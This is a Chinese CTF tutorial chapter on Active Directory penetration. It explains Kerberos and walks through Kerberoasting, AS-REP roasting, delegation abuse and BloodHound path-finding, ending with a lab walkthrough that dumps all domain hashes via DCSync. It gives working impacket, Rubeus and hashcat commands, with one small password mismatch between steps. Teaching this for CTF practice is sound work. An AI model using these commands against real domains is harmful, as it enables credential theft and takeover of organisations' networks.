---
comments: true
---

# 域渗透入门

在内网渗透类的 CTF 赛题（尤其是大型攻防演练、AWD 后的内网环节、以及模拟企业环境的靶场）中，拿下边界 Web 服务器往往只是第一步——真正的目标藏在 Windows 域（Active Directory，简称 AD）里。本章讲清楚域渗透的基础概念和最经典的几个攻击手法，做到"够用即止"：看懂题目拓扑、会识别域环境、理解 Kerberos 认证、知道每个漏洞点该用什么工具打。

域环境的基础是 Windows，建议读者先掌握本书「Web入门题单」中的基础命令，并对「敏感信息泄露」一章提到的凭据收集思路有所了解——很多域渗透的起点就是一个泄露的账号密码。

## 工作组与域

### 工作组（Workgroup）

单机、家庭和小型局域网最常见的工作模式。每台机器各自维护自己的账号数据库（SAM），账号密码只在本机有效，`PC1` 上的账号 `admin` 在 `PC2` 上完全不存在。管理十台机器就要维护十套账号，机器一多就是灾难。

### 域（Domain）

域是微软给出的集中式管理方案：把一堆 Windows 机器纳入一个"组织"，由一台专门的机器——**域控（Domain Controller, DC）**——统一存储和管理所有账号。核心区别在于：

- 账号存在 DC 的 NTDS.dit 数据库里，而不是各台机器本地；
- 域内任何一台机器都可以用域账号登录，权限由 DC 说了算；
- 管理员可以在 DC 上一条策略下发到全域所有机器。

一句话：工作组是"各管各的"，域是"一个老板管所有人"。对攻击者来说，这意味着 **拿下域控 ≈ 拿下整个域**——所有域账号的哈希都在域控上，这既是防守方的命根子，也是进攻方的终点。

## 域核心概念

### 域控（DC）与域名

域用域名标识，形如 `hack.lab`、`corp.com`。域内主机名通常是 `机器名.域名`，例如 `DC01.hack.lab`。域控是一台安装了 AD DS（Active Directory Domain Services）角色的 Windows Server，存储着全域的账号数据库 `NTDS.dit`，同时通常兼任域的 DNS 服务器——这是一个非常重要的识别特征。

### 域用户与域组

域用户身份一般写成 `域名\用户名`（如 `HACK\alice`）或 UPN 格式 `alice@hack.lab`。

记住几个关键域组就够了：

- `Domain Admins`（域管理员）：域内最高权限，攻击的最终目标；
- `Enterprise Admins`：跨整个林（多个域组成的集合）的最高权限；
- `Domain Users`：所有域用户默认都在里面；
- `Domain Computers`：每台加入域的机器自动有一个机器账号，名字带 `$` 后缀（如 `WEB01$`）。机器账号也是账号，同样有密码（每 30 天自动更换），同样可以用于认证——很多攻击手法（如约束委派利用、Silver Ticket）都要用到它。

### 组策略（GPO）

组策略（Group Policy Object）是域管理员批量下发配置的手段：桌面壁纸、软件安装、账号权限、脚本……全都可以通过 GPO 推送到全域机器。GPO 存在域控的共享目录 `\\DC\SYSVOL` 里。

对渗透的意义有两点：

1. SYSVOL 里的 XML 配置文件历史上存在过泄露加密密码的问题（`cpassword`，AES 密钥被微软自己公开了），用 `Get-GPPPassword` 之类的工具就能解出本地管理员密码；
2. 拿到高权限后可以篡改 GPO，给全域机器下发恶意脚本，实现批量控制。

## 域环境识别与域控定位

进入一台内网机器后，第一件事是搞清楚：这是不是域内的机器？域控在哪？

### 判断是否加入域

```bash
# 查看系统信息，重点看 "Domain" 一行
systeminfo
```

输出中 `Domain: hack.lab` 表示已加域；如果是 `WORKGROUP` 就是工作组机器。

```powershell
# PowerShell 判断（返回 True 即已加域）
(Get-WmiObject Win32_ComputerSystem).PartOfDomain
```

### 定位域控

```bash
# 最直接的一条：查询当前域的域控列表
net group "Domain Controllers" /domain
```

```bash
# 查看本机登录服务器（往往就是域控）
set logonserver
echo %LOGONSERVER%
```

```bash
# 通过时间服务确认——域内机器默认与域控同步时间
net time /domain
```

```bash
# 域名解析：域控通常兼任 DNS，看 DNS 指向谁
nslookup hack.lab
ipconfig /all
```

域控的典型特征（内网扫描时的识别依据）：

- 开放 389/636（LDAP）、88（Kerberos）、53（DNS）、445（SMB）、135（RPC）、3268（GC）端口；
- 主机名常带 `DC`、`AD` 字样；
- 作为 DNS 服务器被全域机器指向。

在 CTF 题目里，拓扑往往已经画出域控位置，但上述命令在"盲打"环节能帮你快速确认。

## Kerberos 认证流程入门

域内的身份认证协议是 Kerberos（端口 88），它是后续 PTT（Pass The Ticket）、Kerberoasting 等一切票据攻击的基础，必须理解。

### 三个角色

- **客户端（Client）**：想访问服务的用户/机器；
- **KDC（Key Distribution Center）**：密钥分发中心，就运行在域控上，内部又分为两个服务：
  - **AS（Authentication Service）**：负责"验明正身"，发 TGT；
  - **TGS（Ticket Granting Service）**：负责"发票"，发服务票据；
- **服务端（Server）**：提供具体服务（文件共享、SQL Server、HTTP 等）的机器。

### 认证流程（图解式描述）

```
  Client                      DC (KDC)                    Server
    |                           |                           |
    |-- (1) AS-REQ -----------> |                           |
    |   "我是 alice，请给我门票"  |                           |
    |                           |                           |
    | <- (2) AS-REP ----------  |                           |
    |   返回 TGT（用 krbtgt 的密钥 |                           |
    |   加密）+ 会话密钥          |                           |
    |                           |                           |
    |-- (3) TGS-REQ ----------> |                           |
    |   出示 TGT，请求访问        |                           |
    |   "cifs/WEB01" 的票据      |                           |
    |                           |                           |
    | <- (4) TGS-REP ---------- |                           |
    |   返回 ST 服务票据（用目标    |                           |
    |   服务账号的密钥加密）       |                           |
    |                           |                           |
    |-- (5) AP-REQ ---------------------------------------> |
    |   出示 ST，请求访问服务      |                           |
    |                                                     |-- (6) 验证通过，建立会话
```

分步解读：

1. **AS-REQ**：客户端向 KDC 发起认证请求，其中包含一个用用户密码哈希加密的时间戳，证明自己知道密码；
2. **AS-REP**：KDC 验证通过后返回 **TGT（Ticket Granting Ticket，黄金票据的"原型"）**。TGT 用 `krbtgt` 账号的密钥加密，客户端自己解不开也没关系，它只需要"拿着"这张票去换别的票。这一步同时返回一个与 KDC 通信用的会话密钥；
3. **TGS-REQ**：客户端想访问某个服务（比如 WEB01 上的 CIFS 文件共享）时，拿着 TGT 向 KDC 申请该服务的票据，请求里写明服务名（SPN，如 `cifs/web01.hack.lab`）；
4. **TGS-REP**：KDC 返回 **ST（Service Ticket，服务票据）**。ST 用 **目标服务账号的密码哈希** 加密——注意这句话，Kerberoasting 的攻击点就在这里；
5. **AP-REQ**：客户端把 ST 出示给服务端；
6. 服务端用自己的密钥解开 ST，确认客户端身份合法，建立会话。

### 这为什么是攻击的基础

- 整个流程里，**服务端只验证票据本身是否合法，不回域控确认**。所以只要你伪造出一张合法的票据（黄金票据/Silver Ticket），服务端就认——这就是 PTT（Pass The Ticket）类攻击；
- TGT 用 `krbtgt` 的密钥加密，谁拿到 `krbtgt` 的哈希，谁就能自己签发任意用户的 TGT（黄金票据），等于域内"上帝"；
- ST 用服务账号的密码哈希加密，如果服务账号密码够弱，就能对 ST 离线爆破（Kerberoasting）。

## 常见域内打法概览

以下每个手法只讲思想和最典型的命令，目标是让你在 CTF 中遇到对应场景时能立刻反应"该用什么"。

### Kerberoasting

**思想**：任何域用户都可以合法地向 KDC 申请任意服务的服务票据（ST），而 ST 是用 **服务账号的密码哈希** 加密的。把 ST 导出后离线爆破，就能还原出服务账号的明文密码。攻击门槛极低——只需要一个普通域用户。

前提：目标服务账号配置了 SPN（服务主体名），通常是运行 SQL Server、IIS 等服务的域账号。

```bash
# 请求所有 SPN 账号的服务票据并导出为可爆破格式
impacket-GetUserSPNs hack.lab/alice:'Passw0rd!' -dc-ip 10.0.0.10 -request

# hashcat 爆破（RC4 类型的票据，模式 18200）
hashcat -m 18200 spn.hash rockyou.txt
```

防御方视角的加固也很简单：服务账号用超长随机密码或 gMSA，就不会被爆出来。反过来，CTF 里一旦拿到服务票据，`rockyou.txt` 跑一跑大概率能出。

### AS-REP Roasting

**思想**：Kerberos 的 AS-REP 阶段要求客户端先用密码加密时间戳"自证身份"，这叫 **预认证（Pre-Authentication）**。如果管理员手滑给某个账号勾上了"Do not require Kerberos preauthentication"（不需要预认证），那么任何人——甚至 **不需要任何凭据**——都可以向 KDC 索要这个账号的 AS-REP 数据，其中包含用该账号密码哈希加密的密文，同样可以离线爆破。

与 Kerberoasting 的区别：Kerberoasting 需要一个域用户凭据（申请 ST 要先有 TGT），AS-REP Roasting 连凭据都不需要。

```bash
# 枚举指定用户列表中不需要预认证的账号并导出密文
impacket-GetNPUsers hack.lab/ -usersfile users.txt -dc-ip 10.0.0.10 -format hashcat

# 若已有任一域凭据，直接枚举全域
impacket-GetNPUsers hack.lab/alice:'Passw0rd!' -dc-ip 10.0.0.10 -request

# hashcat 爆破（模式 18200，与 Kerberoasting 相同格式）
hashcat -m 18200 asrep.hash rockyou.txt
```

### 委派问题概述（非约束委派）

**委派（Delegation）** 解决的是"服务替用户办事"的问题：用户访问前端 Web 服务器，Web 服务器需要拿用户的身份去访问后端数据库——这就需要用户把凭证"委托"给 Web 服务器。

**非约束委派（Unconstrained Delegation）** 是最粗暴的实现：用户访问一台配置了非约束委派的机器时，会把自己的 **TGT 直接存进这台机器的内存**。这台机器随即可以用这个 TGT 冒充用户访问任何服务。

攻击思路：

1. 找出一台配置了非约束委派、且被你控制（已拿下或有漏洞）的机器；
2. 在上面监控/导出进入的 TGT（用 Rubeus 的 `monitor` 功能）；
3. 想办法诱导域控或高权限用户访问这台机器（比如经典的 Printer Bug / PetitPotam 强制域控回连），它的 TGT 就到手了；
4. 拿着域控机器账号的 TGT 做 DCSync，导出全域哈希，游戏结束。

```powershell
# Rubeus 监控进入本机的票据（需管理员权限）
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# 拿到票据后注入当前会话使用（PTT）
Rubeus.exe ptt /ticket:base64编码的票据
```

**一句话**：非约束委派 = 这台机器上会自动"捡到"来访用户的 TGT，捡到谁的就能冒充谁。

### 约束委派

**约束委派（Constrained Delegation）** 是微软对非约束委派的"打补丁"版本：服务只能代替用户访问 **指定的** 服务，而不是任意服务。它依赖两个 Kerberos 扩展：

- **S4U2Self**：服务可以"自称"某用户，向 KDC 申请一张该用户访问自己的票据；
- **S4U2Proxy**：拿着上面这张票据，向 KDC 换取该用户访问指定后端服务的票据。

攻击思想：如果你拿下了一个配置了约束委派的服务账号（比如通过 Kerberoasting 爆出了它的密码），就可以利用 S4U2Self + S4U2Proxy 这条链路，冒充域管理员访问被允许委派的后端服务——而后端服务往往就是域控上的 CIFS/LDAP，拿下即等于拿下域控。

```bash
# 用约束委派账号请求域管理员访问域控 CIFS 的票据
impacket-getST -spn 'cifs/DC01.hack.lab' \
  -impersonate 'administrator' \
  'hack.lab/web-svc:ServicePass123!' -dc-ip 10.0.0.10

# 设置票据缓存后直接用（Linux 下 PTT）
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass hack.lab/administrator@DC01.hack.lab
```

还有更复杂的 **基于资源的约束委派（RBCD）**，核心思想相同：利用委派配置的信任链伪造票据。CTF 里遇到"某个账号密码已知 + 配置了委派"的场景，条件反射就该想到这条链。

### 一张速查表

| 手法 | 前置条件 | 结果 |
| --- | --- | --- |
| Kerberoasting | 任一域用户凭据 | 爆出服务账号明文密码 |
| AS-REP Roasting | 无（账号未启用预认证即可） | 爆出目标账号明文密码 |
| 非约束委派 | 控制一台配置非约束委派的机器 | 截获访问者的 TGT，PTT 横向 |
| 约束委派 | 拿下配置约束委派的服务账号 | 冒充管理员访问后端服务 |

## BloodHound 信息收集简介

域一大、机器一多，"谁是谁的管理员、谁能委派到谁、哪条路径通向域管"靠人脑根本理不清。**BloodHound** 就是把域内所有关系画成一张图的工具，让你一眼看出从当前立足点到域管的最短攻击路径。

### 工作原理

BloodHound 分两部分：

1. **收集器 SharpHound**：在域内机器上运行（C# 版）或用 `bloodhound-python` 在攻击机上远程采集，通过 LDAP、SMB 等协议收集域内对象——用户、组、计算机、GPO、ACL、登录会话、委派关系等，导出为 zip（内含一堆 JSON）；
2. **图数据库 + 前端**：把 zip 导入 Neo4j 数据库，BloodHound 前端以节点-边图展示关系，内置大量查询（如"Shortest Path to Domain Admins"——到域管的最短路径）。

```bash
# 远程采集（不需要在域机器上落地文件）
bloodhound-python -u alice -p 'Passw0rd!' \
  -d hack.lab -dc DC01.hack.lab \
  -c All --zip

# 或在域内机器上运行 SharpHound
SharpHound.exe -c All --zipfilename bloodhound.zip
```

导入后在查询框里点 **"Shortest Path to Domain Admins"**，它会直接画出类似这样的路径：

```
alice → (GenericWrite) → svc-web → (AllowedToDelegate) → DC01 → Domain Admins
```

每一条边都对应一种可利用的关系（写权限、委派、组嵌套、本地管理员……），顺着边打就行。

### CTF 中的实用提示

- 大型内网靶场题中，BloodHound 基本必用，"最短路径"查询通常是解题钥匙；
- 关注 `DCSync`、`GenericAll`、`WriteDacl`、`AllowedToDelegate` 这几类高危边；
- 数据有时效性：收集的时间点不同，会话（Session）信息会变化，路径可能时有时无。

## 例题实战：从 Web 入口到域控

下面是一道典型的内网综合题的完整思路，把本章知识点串起来。题目拓扑：边界一台 Web 服务器（工作组机器，双网卡），内网是一个 `hack.lab` 域（DC01 为域控，IP `10.0.0.10`，另有数据库服务器 SQL01）。

**第一步：Web 打点。** 边界 Web 站存在文件上传漏洞（利用思路见本书「文件上传」一章），上传 WebShell 后执行命令，用 Potato 类工具提权拿到 SYSTEM。建立隧道，把内网流量代理进攻击机。

**第二步：信息收集，识别域环境。** 在 Web 服务器上翻到一个配置文件 `web.config`，里面有数据库连接串：

```xml
<connectionStrings>
  <add name="db" connectionString="Server=SQL01.hack.lab;Database=app;
       User Id=svc-sql;Password=Sql@2024!"/>
</connectionStrings>
```

`SQL01.hack.lab` 这个域名后缀暴露了内网域名 `hack.lab`。顺着「敏感信息泄露」的思路，把凭据 `svc-sql / Sql@2024!` 记下来。

**第三步：域控定位与验证。**

```bash
# 通过代理对内网定位域控
crackmapexec smb 10.0.0.0/24
# 输出中 DC01 的签名和域名列会标明它是域控
```

**第四步：Kerberoasting。** 手头的 `svc-sql` 是域账号（连接的是域内 SQL Server），先试它能否认证域，再用它（或任一域凭据）发起 Kerberoasting：

```bash
impacket-GetUserSPNs 'hack.lab/svc-sql:Sql@2024!' -dc-ip 10.0.0.10 -request
```

导出一张 `http/webbackup.hack.lab` 服务账号 `svc-backup` 的票据，hashcat 爆破：

```bash
hashcat -m 18200 spn.hash rockyou.txt
# 爆出：Backup@123
```

**第五步：BloodHound 找路径。** 用新凭据采集域信息：

```bash
bloodhound-python -u svc-backup -p 'Backup@123' -d hack.lab -dc DC01.hack.lab -c All --zip
```

导入后发现：`svc-backup` 账号配置了到 DC01 上 `cifs` 服务的 **约束委派**。

**第六步：约束委派攻击，拿下域控。**

```bash
# 冒充域管 administrator 申请访问 DC01 CIFS 的票据
impacket-getST -spn 'cifs/DC01.hack.lab' -impersonate 'administrator' \
  'hack.lab/svc-backup:Backup@123!' -dc-ip 10.0.0.10

export KRB5CCNAME=administrator.ccache

# 用票据直接 DCSync，导出全域哈希（krbtgt、administrator 全到手）
impacket-secretsdump -k -no-pass hack.lab/administrator@DC01.hack.lab
```

**第七步：拿 flag。** flag 在域控桌面：

```bash
impacket-wmiexec -k -no-pass hack.lab/administrator@DC01.hack.lab
# C:\> type C:\Users\Administrator\Desktop\flag.txt
# flag{4d_penetrati0n_from_web_t0_dc}
```

**复盘**：Web 漏洞打点 → 配置文件泄露域凭据 → Kerberoasting 爆破服务账号 → BloodHound 发现委派路径 → 约束委派冒充域管 → DCSync 拿下全域。每一步都对应本章的一个知识点。

## 小结与延伸

本章讲了域渗透的骨架：域的本质是集中式账号管理，域控是全域的核心；Kerberos 认证中 TGT/ST 的加密密钥决定了攻击面——`krbtgt` 密钥失守就是黄金票据，服务账号密钥弱就被 Kerberoasting；委派机制的设计缺陷让"服务替用户办事"变成了权限提升的跳板；BloodHound 把复杂的信任关系变成一张能看懂的图。

想继续深入，可以按这个顺序补：PTT 与金银票据的细节、DCSync 与 NTDS.dit 的提取、ACL 滥用（DCSync 权限、GenericAll）、以及 Exchange、AD CS（证书服务）等新攻击面。工具链上，Impacket 全家桶 + Rubeus + BloodHound 足以应付绝大多数 CTF 域渗透场景。
